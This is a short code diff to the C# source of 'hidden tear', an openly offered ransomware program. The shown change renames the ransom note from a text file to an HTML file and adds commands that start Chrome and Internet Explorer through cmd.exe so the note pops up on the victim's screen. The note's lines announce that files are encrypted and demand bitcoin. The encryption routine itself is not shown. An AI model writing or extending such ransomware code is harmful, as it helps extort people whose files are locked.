@@ -183,10 +183,19 @@ namespace hidden_tear
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\test\\READ_IT.txt";
+            string path = "\\Desktop\\test\\READ_IT.html";
             string fullpath = userDir + userName + path;
             string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
             System.IO.File.WriteAllLines(fullpath, lines);
+
+			//Display the message with browsers...
+			string strCmdText;
+			strCmdText= "/C start Chrome "+fullpath;
+			System.Diagnostics.Process.Start("cmd.exe",strCmdText);
+			strCmdText= "/C start iexplore.exe "+fullpath;
+			System.Diagnostics.Process.Start("cmd.exe",strCmdText);
+
+
         }
     }
 }
